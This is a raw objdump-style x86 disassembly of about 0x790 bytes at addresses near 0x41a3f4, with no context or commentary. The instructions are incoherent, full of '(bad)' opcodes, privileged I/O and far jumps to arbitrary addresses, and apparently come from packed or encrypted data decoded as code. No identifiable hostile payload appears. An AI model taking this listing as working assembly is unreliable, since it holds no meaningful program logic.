  41a3f4:	pop    edx
  41a3f5:	fdiv   QWORD PTR [ecx-0x15]
  41a3f8:	push   edi
  41a3f9:	cwde   
  41a3fa:	test   al,0x52
  41a3fc:	cdq    
  41a3fd:	retf   0x5457
  41a400:	jbe    0x41a41a
  41a402:	clc    
  41a403:	js     0x41a3aa
  41a405:	xchg   edx,eax
  41a406:	jo     0x41a43b
  41a408:	gs sub DWORD PTR ss:[ebp-0x4d6d148e],eax
  41a410:	and    al,BYTE PTR [ebx+0x6c]
  41a413:	and    ebp,eax
  41a415:	pop    edx
  41a416:	das    
  41a417:	sbb    dh,al
  41a419:	adc    esp,ecx
  41a41b:	sub    eax,0xacfa8f3
  41a420:	leave  
  41a421:	mov    bh,0xdc
  41a423:	push   0x71a5a2a4
  41a428:	outs   dx,DWORD PTR ds:[esi]
  41a429:	scas   al,BYTE PTR es:[edi]
  41a42a:	mov    WORD PTR [ebp+0x54c3314b],ss
  41a430:	mov    ch,0x20
  41a432:	es sbb al,0xf8
  41a435:	popf   
  41a436:	jg     0x41a3dc
  41a438:	add    eax,0x67a18de2
  41a43d:	or     eax,0xe3dff660
  41a442:	mov    edx,DWORD PTR [edx+ebp*4-0x4012d8f9]
  41a449:	into   
  41a44a:	xor    eax,0xc761b8b3
  41a44f:	push   ss
  41a450:	xchg   ebx,eax
  41a451:	(bad)  
  41a452:	mov    esi,0x378d33fe
  41a457:	(bad)  
  41a458:	outs   dx,BYTE PTR ds:[esi]
  41a459:	sbb    cl,dh
  41a45b:	(bad)  
  41a45c:	pop    DWORD PTR [ecx]
  41a45e:	sbb    dl,BYTE PTR [edi+eiz*2+0x50]
  41a462:	jns    0x41a4c4
  41a464:	push   ds
  41a465:	fdivr  DWORD PTR [edi]
  41a467:	fs jp  0x41a4af
  41a46a:	aaa    
  41a46b:	xlat   BYTE PTR ds:[ebx]
  41a46c:	pop    esi
  41a46d:	xchg   BYTE PTR [ecx-0x4b5cdc7f],bh
  41a473:	rol    BYTE PTR [edi-0x26],0xe6
  41a477:	jne    0x41a4b5
  41a479:	repz dec edi
  41a47b:	popf   
  41a47c:	xor    BYTE PTR [ecx+0x59b7cf22],ah
  41a482:	inc    edi
  41a483:	dec    ecx
  41a484:	ror    bl,1
  41a486:	test   DWORD PTR [esi+0x51],ebx
  41a489:	dec    edx
  41a48a:	or     DWORD PTR [eax-0x30187e50],0xffffffdb
  41a491:	jno    0x41a4e6
  41a493:	je     0x41a4c7
  41a495:	(bad)  
  41a496:	fidivr WORD PTR [esi-0x57]
  41a499:	in     ax,0x61
  41a49c:	sub    ecx,ebp
  41a49e:	test   DWORD PTR [esi-0x4e062a04],0x23ad1e75
  41a4a8:	sub    al,0x7a
  41a4aa:	mov    dl,0x59
  41a4ac:	push   es
  41a4ad:	fdivr  QWORD PTR [eax+0x5491a4ff]
  41a4b3:	sbb    DWORD PTR [ecx],esp
  41a4b5:	or     eax,0x86e7cbc3
  41a4ba:	xchg   edi,eax
  41a4bb:	ds adc eax,0x15c78141
  41a4c1:	push   ebp
  41a4c2:	or     BYTE PTR [ebx+eax*4-0x29c31f39],cl
  41a4c9:	sahf   
  41a4ca:	add    ch,BYTE PTR [esi+edi*8+0x68]
  41a4ce:	sbb    DWORD PTR [ebp-0x79],ebx
  41a4d1:	aam    0x19
  41a4d3:	mov    dl,BYTE PTR [ebx+0x235c110b]
  41a4d9:	sbb    ch,BYTE PTR es:[esi+0x4d]
  41a4dd:	sbb    eax,0xee91165f
  41a4e2:	jp     0x41a4ad
  41a4e4:	out    0xb9,al
  41a4e6:	in     eax,0xe7
  41a4e8:	sti    
  41a4e9:	inc    edx
  41a4ea:	push   eax
  41a4eb:	xchg   ebp,eax
  41a4ec:	arpl   WORD PTR [edi-0x62a7b62b],ax
  41a4f2:	inc    esp
  41a4f3:	push   ebx
  41a4f4:	enter  0x8d4a,0x6
  41a4f8:	addr16 pop es
  41a4fa:	sub    bh,BYTE PTR [esi+0x4f6f66eb]
  41a500:	or     DWORD PTR [ebp-0x49c07c76],edx
  41a506:	call   0x1b38f781
  41a50b:	daa    
  41a50c:	mov    al,0x71
  41a50e:	jb     0x41a4fd
  41a510:	scas   al,BYTE PTR es:[edi]
  41a511:	std    
  41a512:	sub    BYTE PTR [esi-0x144c8bfe],ah
  41a518:	jle    0x41a4ee
  41a51a:	daa    
  41a51b:	push   0x2b
  41a51d:	jmp    0x41a599
  41a51f:	inc    ebp
  41a520:	dec    eax
  41a521:	mov    edx,edx
  41a523:	push   edi
  41a524:	aad    0xed
  41a526:	pop    edi
  41a527:	mov    ebp,0x790b482d
  41a52c:	loopne 0x41a51a
  41a52e:	fnstcw WORD PTR [edx+0x13]
  41a531:	mov    ds:0xe8f2c58e,al
  41a536:	stos   DWORD PTR es:[edi],eax
  41a537:	fimul  WORD PTR [eax]
  41a539:	xchg   esi,eax
  41a53a:	xchg   edi,eax
  41a53b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a53c:	and    ch,BYTE PTR [esi+0x6b901f61]
  41a542:	leave  
  41a543:	ret    0x8662
  41a546:	jns    0x41a4cd
  41a548:	sbb    ebx,DWORD PTR [esi]
  41a54a:	cmp    al,0xe3
  41a54c:	sbb    BYTE PTR [eax-0x7030345c],dh
  41a552:	mov    eax,0xdcc64a84
  41a557:	sub    BYTE PTR [ebp-0x56],0x6f
  41a55b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a55c:	dec    esp
  41a55d:	jmp    0x5ad7:0x3ba9c668
  41a564:	sbb    al,0xcf
  41a566:	mov    ss,WORD PTR [ebp+edx*8+0x78]
  41a56a:	and    DWORD PTR [ecx-0x24],eax
  41a56d:	addr16 mov ah,0x92
  41a570:	repnz mul DWORD PTR [eax-0x70317c59]
  41a577:	shl    ah,0x70
  41a57a:	pop    ecx
  41a57b:	imul   edi,DWORD PTR [ebp-0x9],0x1d
  41a57f:	mov    bh,0xa7
  41a581:	loopne 0x41a5a1
  41a583:	cld    
  41a584:	mov    dl,0xc0
  41a586:	daa    
  41a587:	push   esi
  41a588:	ret    0xf867
  41a58b:	push   esp
  41a58c:	xchg   ebx,eax
  41a58d:	mov    bl,0xb4
  41a58f:	aas    
  41a590:	xchg   DWORD PTR [ebp-0x4a],edx
  41a593:	test   esi,0xcf23cb3b
  41a599:	xchg   edi,eax
  41a59a:	mov    dh,0x2b
  41a59c:	clts   
  41a59e:	xor    al,0x4
  41a5a0:	shr    edi,0xb5
  41a5a3:	cmc    
  41a5a4:	fsub   DWORD PTR [edi+0x3b]
  41a5a7:	fmul   QWORD PTR [ecx]
  41a5a9:	(bad)  
  41a5aa:	aas    
  41a5ab:	mov    dh,0x9b
  41a5ad:	cmp    dh,BYTE PTR [esi-0x519d5625]
  41a5b3:	inc    esi
  41a5b4:	add    BYTE PTR [edi-0x1f],ch
  41a5b7:	int    0x5c
  41a5b9:	jmp    0xc376:0x80d9df94
  41a5c0:	nop
  41a5c1:	shl    DWORD PTR [edi-0x4],1
  41a5c4:	lods   eax,DWORD PTR ds:[esi]
  41a5c5:	aad    0x5a
  41a5c7:	push   ebp
  41a5c8:	pop    esp
  41a5c9:	pop    ebp
  41a5ca:	jp     0x41a5fc
  41a5cc:	sub    DWORD PTR [edi-0xe],ecx
  41a5cf:	shl    DWORD PTR [edx-0x7752f1b6],1
  41a5d5:	in     eax,0x66
  41a5d7:	loope  0x41a5f6
  41a5d9:	push   0xffffffb0
  41a5db:	xor    DWORD PTR ds:0x4b539c03,ecx
  41a5e1:	stc    
  41a5e2:	cmp    bl,BYTE PTR [edx+0x5eba35c]
  41a5e8:	in     al,dx
  41a5e9:	popf   
  41a5ea:	jmp    DWORD PTR [eax+0x70a57f6f]
  41a5f0:	ins    BYTE PTR es:[edi],dx
  41a5f1:	fcom   DWORD PTR [ecx+ecx*4+0x43]
  41a5f5:	or     bl,dl
  41a5f7:	push   eax
  41a5f8:	and    eax,0xadabb6bb
  41a5fd:	and    eax,0x8f67a58c
  41a602:	xor    dh,al
  41a604:	shl    DWORD PTR [ebx],0xad
  41a607:	cmp    eax,0x639642a0
  41a60c:	int    0x68
  41a60e:	push   edx
  41a60f:	cwde   
  41a610:	pop    eax
  41a611:	xchg   edx,eax
  41a612:	(bad)  
  41a613:	cs jle 0x41a5a3
  41a616:	in     eax,0x40
  41a618:	fdivr  DWORD PTR [ebx+eax*1]
  41a61b:	jmp    0x41a5c4
  41a61d:	es mov bh,0x89
  41a620:	push   ss
  41a621:	inc    eax
  41a622:	pop    esp
  41a623:	inc    edx
  41a624:	loopne 0x41a61e
  41a626:	mov    eax,ds:0xc8f3a267
  41a62b:	arpl   WORD PTR [ebx],bp
  41a62d:	jmp    0xb8e4:0x6a39174e
  41a634:	sub    BYTE PTR [ebx-0x206b2464],al
  41a63a:	or     BYTE PTR [ebp-0x470e0aa6],cl
  41a640:	clc    
  41a641:	fwait
  41a642:	clc    
  41a643:	pusha  
  41a644:	cmp    DWORD PTR [esi],esi
  41a646:	cmp    eax,0x3a9730c5
  41a64b:	sbb    al,0xa5
  41a64d:	jo     0x41a646
  41a64f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a650:	ds loopne 0x41a5f7
  41a653:	and    DWORD PTR [edx+0x22d05891],esi
  41a659:	test   DWORD PTR [eiz*1+0x58e73fc8],ecx
  41a660:	nop
  41a661:	in     al,dx
  41a662:	lds    esp,FWORD PTR [esi-0x22]
  41a665:	test   eax,0x4ab22e1
  41a66a:	lods   al,BYTE PTR ds:[esi]
  41a66b:	adc    al,BYTE PTR [ebx+eax*2+0x25]
  41a66f:	rcr    edx,0xd0
  41a672:	inc    esi
  41a673:	sub    DWORD PTR [edi+0x4c3d716d],esp
  41a679:	sbb    cl,BYTE PTR ds:0xb3c34c7f
  41a67f:	xchg   esp,eax
  41a680:	sahf   
  41a681:	mov    al,ds:0xa2f94d8f
  41a686:	jge    0x41a6e5
  41a688:	test   eax,0xb75fe463
  41a68d:	les    ebp,FWORD PTR [ebp+0x749d83d1]
  41a693:	cs stc 
  41a695:	pop    esi
  41a696:	imul   eax,DWORD PTR [eax-0x1262023a],0xffffffec
  41a69d:	pop    ss
  41a69e:	and    eax,DWORD PTR [ebp-0x77e66532]
  41a6a4:	push   0x5b
  41a6a6:	in     al,dx
  41a6a7:	pusha  
  41a6a8:	cmp    al,0xe7
  41a6aa:	cwde   
  41a6ab:	jns    0x41a638
  41a6ad:	pop    ebx
  41a6ae:	ja     0x41a6bd
  41a6b0:	sahf   
  41a6b1:	mov    edi,0xbe2c6719
  41a6b6:	jno    0x41a6f2
  41a6b8:	push   ebp
  41a6b9:	xor    edx,ecx
  41a6bb:	pop    edx
  41a6bc:	push   ecx
  41a6bd:	xor    eax,0x7dae385c
  41a6c2:	pusha  
  41a6c3:	ret    
  41a6c4:	ret    0x9cc9
  41a6c7:	mov    ebx,0xb6bc5b67
  41a6cc:	repz and BYTE PTR [edi+0x206c43f],dh
  41a6d3:	scas   eax,DWORD PTR es:[edi]
  41a6d4:	in     al,0x9f
  41a6d6:	push   edi
  41a6d7:	mov    dl,0xb0
  41a6d9:	imul   esp,DWORD PTR [eax-0x4b2653d7],0x291a9baa
  41a6e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6e4:	jmp    0x53b1:0xd9265f4b
  41a6eb:	push   ss
  41a6ec:	and    bl,BYTE PTR [esi+ebx*1-0x14]
  41a6f0:	stos   DWORD PTR es:[edi],eax
  41a6f1:	aas    
  41a6f2:	(bad)  
  41a6f4:	pop    ds
  41a6f5:	not    BYTE PTR [esi+0x56]
  41a6f8:	push   edx
  41a6f9:	sub    ah,al
  41a6fb:	xchg   edx,eax
  41a6fc:	enter  0x3456,0x34
  41a700:	(bad)  
  41a702:	lods   al,BYTE PTR ds:[esi]
  41a703:	shr    BYTE PTR [edi+0x66],cl
  41a706:	jae    0x41a6aa
  41a708:	ret    0x6ef4
  41a70b:	inc    ebp
  41a70c:	cwde   
  41a70d:	add    ecx,edx
  41a70f:	pop    esp
  41a710:	dec    eax
  41a711:	jnp    0x41a78d
  41a713:	sbb    al,0x32
  41a715:	sti    
  41a716:	jno    0x41a6c3
  41a718:	add    BYTE PTR [ecx+0x7b],bl
  41a71b:	stc    
  41a71c:	push   ecx
  41a71d:	ja     0x41a778
  41a71f:	lods   eax,DWORD PTR ds:[esi]
  41a720:	jl     0x41a70f
  41a722:	stos   BYTE PTR es:[edi],al
  41a723:	lock sbb ah,BYTE PTR [edx+0x36]
  41a727:	cwde   
  41a728:	ss rcl BYTE PTR ds:[eax],1
  41a72c:	xor    BYTE PTR [edx+0x6ff08543],bl
  41a732:	mov    ch,0x61
  41a734:	pusha  
  41a735:	mov    ah,0x98
  41a737:	mov    ds:0xed4d5c3,eax
  41a73c:	jns    0x41a78b
  41a73e:	mov    ?,WORD PTR [ebx+0x78]
  41a741:	push   cs
  41a742:	pop    ecx
  41a743:	dec    ecx
  41a744:	dec    ecx
  41a745:	(bad)  
  41a746:	inc    edx
  41a747:	out    0x20,al
  41a749:	mov    WORD PTR [eax+0x75],cs
  41a74c:	arpl   WORD PTR [edi],bp
  41a74e:	xchg   esi,eax
  41a74f:	cmp    bl,BYTE PTR [eax+eax*4-0x74]
  41a753:	imul   esi,DWORD PTR [esi],0xf27a387e
  41a759:	dec    esi
  41a75a:	and    eax,0x5fe54b0b
  41a75f:	stc    
  41a760:	sub    edi,DWORD PTR [edx]
  41a762:	mov    ecx,0xbd857da8
  41a767:	icebp  
  41a768:	(bad)  
  41a76a:	cli    
  41a76b:	cmp    DWORD PTR [ecx+0xf],0xfffffffa
  41a76f:	int    0x37
  41a771:	fisubr WORD PTR [edi-0x28]
  41a775:	daa    
  41a776:	push   edi
  41a777:	out    0xf8,eax
  41a779:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a77a:	ins    DWORD PTR es:[edi],dx
  41a77b:	rol    DWORD PTR [edx-0x64],1
  41a77e:	xor    al,0x33
  41a780:	sbb    eax,0x5fe5bbc4
  41a785:	imul   ebx,DWORD PTR [edx+0x553d2a67],0xc
  41a78c:	mov    cx,WORD PTR [ecx-0x27a5af89]
  41a793:	imul   edi,esp,0x7b
  41a796:	addr16 sbb al,0x66
  41a799:	ror    dh,cl
  41a79b:	test   eax,0xb01b3cb4
  41a7a0:	adc    eax,0xaf7dca5e
  41a7a5:	push   esp
  41a7a6:	inc    ecx
  41a7a7:	jne    0x41a7a0
  41a7a9:	mov    BYTE PTR [ebp+0x28067eb0],ch
  41a7af:	push   ecx
  41a7b0:	(bad)  
  41a7b1:	lds    esi,FWORD PTR [eax+ebx*2]
  41a7b4:	test   DWORD PTR [esi-0x15c3080a],eax
  41a7ba:	push   0x90657c0a
  41a7bf:	inc    ecx
  41a7c0:	add    edx,ebp
  41a7c2:	xchg   DWORD PTR [eax-0x79],ebp
  41a7c5:	daa    
  41a7c6:	outs   dx,BYTE PTR ds:[esi]
  41a7c7:	fbstp  TBYTE PTR [ebx]
  41a7c9:	std    
  41a7ca:	dec    esi
  41a7cb:	cmp    ebx,ebx
  41a7cd:	mov    bh,0xed
  41a7cf:	stc    
  41a7d0:	in     eax,0x31
  41a7d2:	mov    edx,0x99c3dbe2
  41a7d7:	loope  0x41a84b
  41a7d9:	push   ecx
  41a7da:	adc    DWORD PTR [esi+esi*8-0xb],0xc93344d2
  41a7e2:	sbb    DWORD PTR [ebp+0x28faa80a],0xfffffffd
  41a7e9:	xor    eax,0xf9c1ac12
  41a7ee:	inc    ebp
  41a7ef:	sub    cl,BYTE PTR [edx+0x3cb3d928]
  41a7f5:	iret   
  41a7f6:	inc    ebp
  41a7f7:	int    0x82
  41a7f9:	pop    ebx
  41a7fa:	test   BYTE PTR [esi+eiz*2],al
  41a7fd:	pop    DWORD PTR [ebp+0x4c4498c9]
  41a803:	adc    cl,BYTE PTR [eax-0x3f75fb0c]
  41a809:	scas   eax,DWORD PTR es:[edi]
  41a80a:	sbb    ah,bh
  41a80c:	xor    al,0x30
  41a80e:	and    DWORD PTR [ebx-0x2b11dddd],edi
  41a814:	(bad)  
  41a815:	sahf   
  41a816:	ds test eax,0x7637ec03
  41a81c:	xchg   DWORD PTR [ebx+0x43],edx
  41a81f:	xor    BYTE PTR [ebx-0x694549b7],bh
  41a825:	mov    edi,0x87e15ebb
  41a82a:	mov    ds:0xc3c3f123,al
  41a82f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a830:	in     al,dx
  41a831:	test   eax,0xbaf883a5
  41a836:	into   
  41a837:	pop    esp
  41a838:	push   edx
  41a839:	xchg   edi,eax
  41a83a:	mov    eax,ds:0x152995d
  41a83f:	loop   0x41a84b
  41a841:	imul   edx,DWORD PTR ds:0xfad2ea68,0xd7f3ea66
  41a84b:	add    ah,0x92
  41a84e:	enter  0x56cf,0xbc
  41a852:	cs dec edx
  41a854:	push   eax
  41a855:	div    BYTE PTR [edi-0x20]
  41a858:	inc    esi
  41a859:	fld    st(7)
  41a85b:	ret    0xc9ba
  41a85e:	stos   BYTE PTR es:[edi],al
  41a85f:	jl     0x41a880
  41a861:	pop    edi
  41a862:	test   eax,0xd0d7561f
  41a867:	inc    esi
  41a868:	cwde   
  41a869:	xchg   ecx,eax
  41a86a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a86b:	sbb    al,0xa9
  41a86d:	cli    
  41a86e:	push   0x52
  41a870:	sar    BYTE PTR [ebx+0x32b29f57],cl
  41a876:	inc    ebp
  41a877:	mov    eax,ebp
  41a879:	stos   DWORD PTR es:[edi],eax
  41a87a:	daa    
  41a87b:	mov    edx,0xab1b97cb
  41a880:	ja     0x41a880
  41a882:	mov    DWORD PTR [esi],esp
  41a884:	lea    ecx,[eax-0x5822918b]
  41a88a:	push   edi
  41a88b:	xor    al,0x59
  41a88d:	int    0x99
  41a88f:	dec    ebx
  41a890:	jno    0x41a85e
  41a892:	call   0x951c:0xd62acb4d
  41a899:	mov    esp,DWORD PTR [eax]
  41a89b:	pop    edx
  41a89c:	les    ebp,FWORD PTR [eax]
  41a89e:	ret    
  41a89f:	in     eax,0x81
  41a8a1:	aas    
  41a8a2:	dec    ebx
  41a8a3:	cli    
  41a8a4:	stos   BYTE PTR es:[edi],al
  41a8a5:	mov    WORD PTR [ebx+0x57e33a49],ds
  41a8ab:	lds    ecx,FWORD PTR [eax+edi*8-0x2f]
  41a8af:	push   cs
  41a8b0:	dec    esp
  41a8b1:	pop    ebp
  41a8b2:	fadd   st,st(6)
  41a8b4:	inc    ecx
  41a8b5:	cmp    cl,dh
  41a8b7:	ins    DWORD PTR es:[edi],dx
  41a8b8:	and    eax,0xe574dee4
  41a8bd:	aas    
  41a8be:	jmp    0x41a8ac
  41a8c0:	inc    edi
  41a8c1:	jg     0x41a932
  41a8c3:	mov    fs,WORD PTR [ebp-0x5f]
  41a8c6:	mov    bh,0x8a
  41a8c8:	push   edi
  41a8c9:	les    edi,FWORD PTR [edi+0x1f]
  41a8cc:	loopne 0x41a8ea
  41a8ce:	or     al,al
  41a8d0:	pop    esp
  41a8d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a8d2:	sub    DWORD PTR [esi+0x6],ebx
  41a8d5:	imul   edi,DWORD PTR [ebp+ebx*8-0x1dec4341],0x2b
  41a8dd:	fdiv   DWORD PTR [edx]
  41a8df:	out    0x93,eax
  41a8e1:	inc    eax
  41a8e2:	push   ds
  41a8e3:	out    dx,al
  41a8e4:	xor    al,0x63
  41a8e6:	inc    ebp
  41a8e7:	cmp    BYTE PTR [ecx],bh
  41a8e9:	jno    0x41a912
  41a8eb:	ja     0x41a8a2
  41a8ed:	fdiv   QWORD PTR [ebp-0x8640c25]
  41a8f3:	das    
  41a8f4:	stos   BYTE PTR es:[edi],al
  41a8f5:	ja     0x41a87f
  41a8f7:	arpl   WORD PTR [eax+ebp*8+0x3f],cx
  41a8fb:	jmp    0x446e:0x4dc35221
  41a902:	in     al,dx
  41a903:	mov    cl,0x13
  41a905:	lds    edx,FWORD PTR [edi+eax*2]
  41a908:	push   0xffffffd0
  41a90a:	scas   eax,DWORD PTR es:[edi]
  41a90b:	in     al,0x59
  41a90d:	sub    cl,dl
  41a90f:	(bad)  
  41a910:	jmp    0xb5e9:0xb084c29d
  41a917:	int    0x7e
  41a919:	pop    edx
  41a91a:	sub    eax,0x65bdeb2e
  41a91f:	cli    
  41a920:	ins    DWORD PTR es:[edi],dx
  41a921:	aaa    
  41a922:	jno    0x41a8ed
  41a924:	loop   0x41a96f
  41a926:	mov    bl,0x4b
  41a928:	popa   
  41a929:	xor    eax,DWORD PTR [edx+0x16]
  41a92c:	cmp    eax,0x953cafb3
  41a931:	ret    
  41a932:	cmp    bh,BYTE PTR [edi+0x2a]
  41a935:	dec    ebp
  41a936:	inc    esp
  41a937:	cmp    al,0xd3
  41a939:	push   esp
  41a93a:	imul   ebp,DWORD PTR [edi],0xe21ffc89
  41a940:	inc    edx
  41a941:	into   
  41a942:	repnz add esi,edi
  41a945:	add    BYTE PTR [ecx+0x65],al
  41a948:	gs out dx,al
  41a94a:	xlat   BYTE PTR ds:[ebx]
  41a94b:	mov    eax,DWORD PTR [bp+si-0x29]
  41a94f:	jl     0x41a92e
  41a951:	sub    BYTE PTR [edi-0x7519c47d],ah
  41a957:	das    
  41a958:	adc    ebx,ebx
  41a95a:	call   0x8106:0x8c329be1
  41a961:	nop
  41a962:	push   0xb203c9ef
  41a967:	imul   DWORD PTR [ecx]
  41a969:	outs   dx,BYTE PTR ds:[esi]
  41a96a:	addr16 push eax
  41a96c:	xor    esi,ebp
  41a96e:	ss jno 0x41a9ee
  41a971:	in     eax,0x7
  41a973:	out    0xa3,al
  41a975:	add    al,0xea
  41a977:	and    esi,DWORD PTR ds:0xfd300e68
  41a97d:	jge    0x41a941
  41a97f:	loope  0x41a924
  41a981:	repz idiv BYTE PTR [eax+eiz*4]
  41a985:	es pop ss
  41a987:	mov    WORD PTR [edx+0x2b],es
  41a98a:	int3   
  41a98b:	stos   BYTE PTR es:[edi],al
  41a98c:	repnz fst DWORD PTR [edi-0x753a7b6c]
  41a993:	adc    DWORD PTR [edi+ecx*2],0xffffffe1
  41a997:	adc    eax,0x67ba4929
  41a99c:	push   eax
  41a99d:	xchg   edx,eax
  41a99e:	scas   eax,DWORD PTR es:[edi]
  41a99f:	adc    eax,0xd75a20c
  41a9a4:	stc    
  41a9a5:	push   cs
  41a9a6:	pop    esp
  41a9a7:	jmp    0x41a9e4
  41a9a9:	push   cs
  41a9aa:	in     al,dx
  41a9ab:	scas   al,BYTE PTR es:[edi]
  41a9ac:	aad    0x13
  41a9ae:	push   ecx
  41a9af:	xchg   DWORD PTR [edi],edi
  41a9b1:	scas   eax,DWORD PTR es:[edi]
  41a9b2:	cs (bad) 
  41a9b4:	leave  
  41a9b5:	sub    eax,0xb945e0c8
  41a9ba:	sbb    al,0x5
  41a9bc:	jmp    0x845a4427
  41a9c1:	pop    ebx
  41a9c2:	mov    ch,0x84
  41a9c4:	push   cs
  41a9c5:	int    0xe4
  41a9c7:	adc    BYTE PTR ds:0x7b38b5ff,0x79
  41a9ce:	pop    es
  41a9cf:	push   ss
  41a9d0:	les    eax,FWORD PTR [edx-0x72]
  41a9d3:	xchg   ebp,eax
  41a9d4:	retf   
  41a9d5:	lock stc 
  41a9d7:	cmp    al,0xff
  41a9d9:	retf   0xf1cf
  41a9dc:	fbstp  TBYTE PTR [esi-0x4a]
  41a9df:	push   ebp
  41a9e0:	push   ss
  41a9e1:	std    
  41a9e2:	adc    al,0x82
  41a9e4:	add    bl,BYTE PTR [edi+0x69]
  41a9e7:	dec    esp
  41a9e8:	jnp    0x41aa48
  41a9ea:	sub    DWORD PTR [esi+edx*2+0x5d],edx
  41a9ee:	push   ebp
  41a9ef:	xchg   ebp,eax
  41a9f0:	push   esp
  41a9f1:	sbb    esi,ebp
  41a9f3:	xchg   esp,eax
  41a9f4:	sbb    BYTE PTR [ecx-0x27e7e2d1],0x63
  41a9fb:	xor    BYTE PTR [edx+0x29e17668],bl
  41aa01:	add    BYTE PTR [edi+0x5fbe1951],dh
  41aa07:	daa    
  41aa08:	pop    esi
  41aa09:	mov    BYTE PTR [ebp+0x37cc50e],bh
  41aa0f:	pop    ss
  41aa10:	out    dx,eax
  41aa11:	cmp    ah,BYTE PTR [edx+0x71e83798]
  41aa17:	fcom   QWORD PTR [esi+ebp*2-0x5b0fa159]
  41aa1e:	and    ch,BYTE PTR [ecx-0x72c17ba2]
  41aa24:	adc    BYTE PTR [eax+0x2fd84aa8],ch
  41aa2a:	push   es
  41aa2b:	call   0x18abd891
  41aa30:	or     DWORD PTR [edx],ecx
  41aa32:	and    al,0x4e
  41aa34:	or     eax,0x8b271021
  41aa39:	mov    al,ss:0xc37192a8
  41aa3f:	(bad)  ss:[edx+0x8bf631b]
  41aa46:	xor    BYTE PTR [eax-0x16],ah
  41aa49:	cdq    
  41aa4a:	jmp    0xd057ff8f
  41aa4f:	mov    bh,0x1
  41aa51:	mov    esi,DWORD PTR [ecx-0x6b]
  41aa54:	fdiv   QWORD PTR [ebx+0x2e0577f0]
  41aa5a:	int3   
  41aa5b:	dec    edi
  41aa5c:	imul   esp,DWORD PTR [ebx-0x710dc78],0xffffff9e
  41aa63:	inc    esi
  41aa64:	sbb    DWORD PTR [ebp+0x32],0x1e
  41aa68:	js     0x41aa2b
  41aa6a:	push   esp
  41aa6b:	mov    cl,0x57
  41aa6d:	nop
  41aa6e:	jns    0x41aacd
  41aa70:	(bad)  
  41aa71:	sti    
  41aa72:	sub    ebp,0xffffffc1
  41aa75:	out    dx,eax
  41aa76:	std    
  41aa77:	push   eax
  41aa78:	int3   
  41aa79:	push   es
  41aa7a:	retf   0xb7bd
  41aa7d:	push   edx
  41aa7e:	das    
  41aa7f:	ret    
  41aa80:	cld    
  41aa81:	mov    ch,0xc1
  41aa83:	mov    ebx,0x423722fb
  41aa88:	sbb    eax,0xaa01c0b
  41aa8d:	and    edx,eax
  41aa8f:	adc    edi,ecx
  41aa91:	push   ds
  41aa92:	mov    ebp,0xc6c21ed
  41aa97:	and    edx,eax
  41aa99:	cmp    dh,BYTE PTR [eax]
  41aa9b:	jo     0x41aa28
  41aa9d:	bound  ecx,QWORD PTR [esi]
  41aa9f:	ja     0x41aae7
  41aaa1:	add    al,0xce
  41aaa3:	mov    eax,0x2dbd5af6
  41aaa8:	jmp    esi
  41aaaa:	jno    0x41aab4
  41aaac:	dec    esp
  41aaad:	addr16 xor edx,edi
  41aab0:	ret    
  41aab1:	pop    esi
  41aab2:	xchg   bh,bh
  41aab4:	sbb    eax,0xb54aed88
  41aab9:	lods   eax,DWORD PTR ds:[esi]
  41aaba:	push   edi
  41aabb:	xchg   ebp,ebp
  41aabd:	popf   
  41aabe:	push   0x2a
  41aac0:	sub    dh,al
  41aac2:	cmp    eax,0x66452ac5
  41aac7:	bound  ecx,QWORD PTR ds:0xf1906996
  41aacd:	sbb    ah,ah
  41aacf:	je     0x41ab44
  41aad1:	dec    edx
  41aad2:	xor    bl,BYTE PTR [edx+0x611d96cf]
  41aad8:	jp     0x41aae4
  41aada:	test   DWORD PTR [ebp+ecx*2-0x6c10fb81],0x1e6a840e
  41aae5:	loop   0x41aaa7
  41aae7:	xchg   edi,eax
  41aae8:	mov    al,0xe4
  41aaea:	jns    0x41aabe
  41aaec:	sbb    eax,0x8a4f5c2a
  41aaf1:	mov    al,0x14
  41aaf3:	and    ah,cl
  41aaf5:	pop    es
  41aaf6:	repnz sub al,0x49
  41aaf9:	out    dx,al
  41aafa:	sbb    DWORD PTR [ecx],esi
  41aafc:	scas   eax,DWORD PTR es:[edi]
  41aafd:	sti    
  41aafe:	mov    al,dh
  41ab00:	pop    esi
  41ab01:	repz mov al,0x6d
  41ab04:	(bad)  
  41ab05:	outs   dx,BYTE PTR ds:[esi]
  41ab06:	mov    ds:0x7f1ce106,al
  41ab0b:	mov    eax,0xbe6c81e6
  41ab10:	push   eax
  41ab11:	and    ebp,ebx
  41ab13:	(bad)  
  41ab14:	imul   edx,DWORD PTR [ecx],0x7d
  41ab17:	idiv   BYTE PTR [edi+0xab6c0dc]
  41ab1d:	enter  0x5b9,0x73
  41ab21:	gs inc edx
  41ab23:	jmp    0x4d2b:0xbc34a8b8
  41ab2a:	push   ebx
  41ab2b:	ret    
  41ab2c:	xchg   edi,eax
  41ab2d:	pop    esp
  41ab2e:	push   ds
  41ab2f:	xlat   BYTE PTR ds:[ebx]
  41ab30:	pushf  
  41ab31:	adc    al,0x81
  41ab33:	push   0xfffffff7
  41ab35:	sub    eax,0x830f1296
  41ab3a:	aaa    
  41ab3b:	bound  ebx,QWORD PTR [eax]
  41ab3d:	lods   al,BYTE PTR ds:[esi]
  41ab3e:	out    dx,al
  41ab3f:	sti    
  41ab40:	inc    esp
  41ab41:	sbb    eax,0xe7da861e
  41ab46:	push   cs
  41ab47:	pop    edx
  41ab48:	dec    eax
  41ab49:	and    al,0xf9
  41ab4b:	push   eax
  41ab4c:	retf   0xc8a8
  41ab4f:	mov    bh,0xc9
  41ab51:	jbe    0x41abbf
  41ab53:	cwde   
  41ab54:	mov    ebp,0xa252170e
  41ab59:	push   0xeeb64ce5
  41ab5e:	sbb    cl,bh
  41ab60:	mov    esi,0x1ff78f91
  41ab65:	icebp  
  41ab66:	call   0x548d:0xc4be2ad8
  41ab6d:	lds    eax,FWORD PTR [esi-0x7227d73]
  41ab73:	stc    
  41ab74:	stc    
  41ab75:	push   ebp
  41ab76:	data16 xor BYTE PTR [edi],bh
  41ab79:	ret    
  41ab7a:	dec    edx
  41ab7b:	inc    ebx
  41ab7c:	sub    bh,dl
  41ab7e:	(bad)  
